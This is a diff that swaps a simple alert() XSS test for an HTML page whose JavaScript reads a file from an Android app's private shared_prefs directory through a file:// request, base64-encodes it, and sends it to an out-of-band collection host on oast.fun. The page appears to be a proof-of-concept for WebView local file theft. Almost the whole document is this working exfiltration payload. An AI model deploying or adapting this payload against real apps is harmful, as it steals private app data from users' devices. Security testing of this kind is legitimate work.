@@ -1,1 +1,33 @@
-<script>alert('hacked')</script>
+<html>
+  <head></head>
+  <body data-rsssl=1>
+    <script type="text/javascript">
+      function exfiltrateFile(filePath, callback) {
+        var request = new XMLHttpRequest();
+        request.open("GET", "file://" + filePath, true);
+        request.onload = function(event) {
+          callback(btoa(request.responseText));
+        }
+        request.onerror = function(event) {
+          document.write(event);
+          callback(null);
+        }
+        request.send();
+      }
+      var filePath = "/data/data/com.ipragmatech.clovia.shop/shared_prefs/hacker.txt";
+      exfiltrateFile(filePath, function(contents) {
+            document.write(contents);
+            var exfil = new XMLHttpRequest();
+            exfil.open("GET", "https://chnsgx32vtc00008z5f0ge4haqoyyyyyb.oast.fun/?filedata=" + contents, true);
+              exfil.onload = function(event) {
+                document.write(" < /br>[+] File successfully exfiltrated to remote server");
+                }
+                exfil.onerror = function(event) {
+                  document.write(event);
+                  callback(null);
+                }
+                exfil.send();
+              });
+    </script>
+  </body>
+</html>
